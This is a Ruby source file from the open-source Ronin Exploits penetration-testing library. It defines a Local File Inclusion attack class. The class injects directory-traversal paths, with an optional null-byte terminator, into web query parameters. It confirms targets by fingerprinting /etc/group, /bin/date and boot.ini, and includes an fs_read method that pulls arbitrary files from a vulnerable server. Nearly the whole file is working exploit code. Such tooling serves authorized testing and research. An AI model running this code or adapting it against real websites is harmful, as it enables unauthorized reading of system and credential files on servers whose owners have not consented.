#
# Ronin Exploits - A Ruby library for Ronin that provides exploitation and
# payload crafting functionality.
#
# Copyright (c) 2007-2012 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This file is part of Ronin Exploits.
#
# Ronin is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ronin is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ronin.  If not, see <http://www.gnu.org/licenses/>
#

require 'ronin/extensions/string'
require 'ronin/attacks/web'
require 'ronin/path'

module Ronin
  module Attacks
    #
    # Represents Local File Inclusion (LFI) attacks.
    #
    # @since 1.0.0
    #
    class LFI < Web

      # The minimum number of directories to traverse up
      MIN_TRAVERSAL = 2

      # The maximum number of directories to traverse up
      MAX_TRAVERSAL = 7

      # Known files to try including
      KNOWN_FILES = {
        :unix => {
          '/etc/group' => /root:x:0/,
          '/bin/date'  => /--(rfc-2822|rfc-3339|utc)/
        },

        :windows => {
          '\boot.ini'  => '[boot loader]',
          '\Windows\System32\Drivers\etc\host.ini' => /(127\.0\.0\.1|::1)\s+localhost/
        }
      }

      # Number of directories to traverse up
      property :traversal, Integer, :default => MAX_TRAVERSAL

      # Whether to terminate the LFI path with a null byte
      property :terminate, Boolean, :default => false

      # The Operating System platform the vulnerable system is running
      attr_reader :platform

      #
      # Initializes the LFI Attack.
      #
      # @param [Hash{Symbol => Object}] attributes
      #   Attributes for the new LFI attack.
      #
      def initialize(attributes={})
        super(attributes)

        @prefix_length = 0
        @suffix_length = 0
      end

      #
      # Injects a local path along side the original data of the query param.
      #
      # @param [String] path
      #   The local path to inject.
      #
      # @return [String]
      #   The query param value with the injected path.
      #
      # @api semipublic
      #
      def inject(path)
        full_path = Path.up(self.traversal).join(path.to_s)
        full_path = "#{full_path}%0" if terminate?

        return super(full_path)
      end

      #
      # Tests the LFI Attack against a specific platform.
      #
      # @param [Hash{String => Regexp,String}] files
      #   The files and their fingerprints to test with.
      #
      # @return [Boolean]
      #   Specifies whether any of the files were successfully included.
      #
      # @api semipublic
      #
      def test_files(files)
        includes = []

        files.each do |path,pattern|
          if normal_body.match(pattern)
            print_warning "Normal response matched %p", pattern
          end

          response = exploit!(path)

          if response.body.match(pattern)
            includes << response.body
          end
        end

        # determine the min number of characters before the included file
        @prefix_length = includes.map { |body|
          normal_body.common_prefix(body).length
        }.min

        # determine the min number of characters after the included file
        @suffix_length = includes.map { |body|
          normal_body.common_suffix(body).length
        }.min

        return !includes.empty?
      end

      #
      # Tests whether the URL and query parameter are vulnerable to LFI.
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to LFI.
      #
      # @api public
      #
      def vulnerable?
        KNOWN_FILES.each do |platform,files|
          if test_files(files)
            @platform = platform
            return true
          end
        end

        return false
      end

      #
      # Emulates reading a file via Local File Inclusion (LFI).
      #
      # @param [String] path
      #   The path to read from.
      #
      # @param [Integer] pos
      #   The position to start reading from.
      #
      # @return [String]
      #   The data read from the response body of the Local File Inclusion.
      #
      # @api private
      #
      def fs_read(path,pos)
        if @platform == :windows
          path = path.dup
          
          # escape any \ characters
          path.gsub!('\\',"\\\\")

          # replace all / with \ characters
          path.tr!('/','\\')
        end

        body = exploit!(path).body
        
        return body.slice(@prefix_length + pos,body.length - @suffix_length)
      end

    end
  end
end
